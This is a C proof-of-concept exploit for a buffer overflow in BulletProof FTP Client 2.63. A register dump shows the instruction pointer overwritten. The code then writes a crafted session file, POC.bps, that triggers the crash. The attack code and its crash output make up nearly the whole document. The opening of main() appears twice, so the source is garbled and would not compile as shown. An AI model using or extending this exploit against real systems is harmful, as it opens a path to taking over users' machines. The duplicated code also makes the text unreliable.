/*
BulletProof FTP Client suffer a buffer overflow (SEH).

Tested on BullerProof FTP Client v. 2.63 build 56 (The last one) but may work with older releases as well

Registers:

EAX 00000000
ECX 65646362
EDX 7C9032BC ntdll.7C9032BC
EBX 00000000
ESP 0012F1E0
EBP 0012F200
ESI 00000000
EDI 00000000
EIP 65646362
C 0  ES 0023 32bit 0(FFFFFFFF)
P 1  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 1  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 003B 32bit 7FFDF000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty -??? FFFF 00FF00FF 00FF00FF
ST1 empty -??? FFFF 00FF00FF 00FF00FF
ST2 empty -??? FFFF 000000F3 00F300F3
ST3 empty -??? FFFF 000000F3 00F300F3
ST4 empty -??? FFFF 00F4F4F4 00F4F4F4
ST5 empty 7.2337335968722701770e+18
ST6 empty 7.3060737696935038410e+18
ST7 empty 7.0169967652934372810e+18
               3 2 1 0      E S P U O Z D I
FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
FCW 1372  Prec NEAR,64  Mask    1 1 0 0 1 0

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *xpl;
char *str;
char message[]="This is a BulletProof FTP Client Session-File and should not be modified directly.\n";
char trash[]="21\nanything\nbpfdhjomeepehepbflql\nC:\\\n/";

int main(){
    int tam;
    FILE *fp;
    printf("Made by: Rafael Sousa\n");
    printf("Produzido por Rafael Sousa\n");

int main(){
    int tam;
    FILE *fp;
    printf("Made by: Rafael Sousa\n");
    printf("Produzido por Rafael Sousa\n");
    str=(char *)malloc(98*sizeof(char));
    memset(str,'a',93);
    str[93]='b';
    str[94]='c';
    str[95]='d';
    str[96]='e';
    str[97]='\0';
    tam=strlen(str)+strlen(message)+strlen(trash);
    printf("%d\n",tam);
    xpl=(char *)malloc((tam+1)*sizeof(char));
    sprintf(xpl,"%s%s\n%s",message,str,trash);
    fp=fopen("POC.bps","w");
    fputs(xpl,fp);
    fclose(fp);
    free(str);
    free(xpl);
    return(0);
}